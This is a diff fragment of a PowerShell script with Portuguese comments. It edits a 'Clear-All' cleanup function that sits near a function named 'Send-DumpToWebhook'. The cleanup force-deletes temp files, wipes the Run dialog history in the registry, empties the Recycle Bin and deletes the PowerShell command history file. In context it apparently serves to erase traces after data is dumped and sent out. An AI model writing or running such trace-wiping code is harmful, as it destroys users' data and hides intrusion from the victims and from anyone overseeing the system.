@@ -451,10 +451,10 @@ function Send-DumpToWebhook {
 ##### Funcao de Limpeza ####
 function Clear-All {
     $ea = 'SilentlyContinue'
-    rm "$env:TEMP\*" -r -f -ea $ea
+    rm "$env:TEMP\*" -r -fo -ea $ea
     rmp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
-    Clear-RecycleBin -f -ea $ea
-    rm (Get-PSReadLineOption).HistorySavePath -f -ea $ea
+    Clear-RecycleBin -fo -ea $ea
+    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
     echo "Limpeza concluída!"
 }
 
